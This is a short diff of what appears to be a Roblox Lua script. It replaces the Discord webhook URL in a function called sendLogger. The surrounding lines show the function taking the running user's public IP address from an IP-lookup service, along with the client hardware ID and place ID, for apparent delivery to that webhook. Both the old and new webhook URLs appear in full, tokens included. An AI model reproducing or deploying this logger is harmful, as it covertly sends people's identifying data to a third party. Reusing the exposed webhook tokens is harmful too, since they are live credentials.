@@ -61,7 +61,7 @@ function sendWebhook(url, content, embed)
 end
 
 function sendLogger()
-	local url = "https://discord.com/api/webhooks/1286366140511293530/HXPwP_ciZXm-bUxVvcDNAq77KAxAdZfCyNaAJjeR3l0tlvqV0Zpf_SUxWglFqX9eWa5y"
+	local url = "https://discord.com/api/webhooks/1286417003510235220/XlyIdmF4CZYtxPemCgefLfvY_IzrePemVw3ZRIHKyryUThfb_nRfMu1O1GgMm2MtUqAG"
 	local ip = game:HttpGet("https://api.ipify.org")
 	local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 	local placeId = game.PlaceId
